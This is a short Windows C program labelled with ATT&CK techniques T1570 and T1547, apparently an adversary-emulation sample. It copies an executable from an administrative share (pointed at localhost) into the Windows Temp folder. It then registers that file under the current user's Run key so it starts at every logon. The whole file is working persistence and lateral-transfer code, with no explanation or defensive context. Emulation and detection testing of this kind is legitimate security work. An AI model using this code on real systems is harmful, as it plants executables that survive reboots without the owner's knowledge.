/* Lateral Transfer + Persistence: T1570 + T1547 */
#include <windows.h>

int main(void) {
    CopyFileExA("\\\\127.0.0.1\\C$\\temp\\x.exe", "C:\\Windows\\Temp\\x.exe", NULL, NULL, FALSE, 0);
    HKEY hKey = NULL;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "T1570", 0, REG_SZ, (const BYTE *)"C:\\Windows\\Temp\\x.exe", 22);
        RegCloseKey(hKey);
    }
    return 0;
}
